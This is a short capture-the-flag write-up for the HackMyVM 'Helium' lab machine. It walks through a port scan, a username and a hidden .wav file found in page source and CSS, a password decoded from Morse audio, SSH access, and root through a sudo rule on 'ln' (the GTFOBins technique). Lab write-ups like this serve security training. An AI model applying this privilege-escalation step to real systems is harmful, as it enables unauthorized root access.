### Write up for https://hackmyvm.eu/machines/machine.php?vm=Helium ###

ip=10.10.10.100
url=http://$ip

threader3000

//22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
//80/tcp open  http    nginx 1.14.2


firefox $url &
//view source code 

// <!-- Please paul, stop uploading weird .wav files using /upload_sound -->
we got a username : paul
visiting: view-source:http://10.10.10.100/bootstrap.min.css we get this /yay/mysecretsound.wav

wget $url/yay/mysecretsound.wav 

googling decode morse from wav // https://morsecode.world/international/decoder/audio-decoder-adaptive.html

uploading and decoding the wav file
pass : da******o

we got user and pass lets try to ssh

cat user.txt 

sudo -l 

User paul may run the following commands on helium:
    (ALL : ALL) NOPASSWD: /usr/bin/ln

https://gtfobins.github.io/ search for ln

sudo ln -fs /bin/bash /usr/bin/ln

root@helium:/home/paul# id
uid=0(root) gid=0(root) groups=0(root)

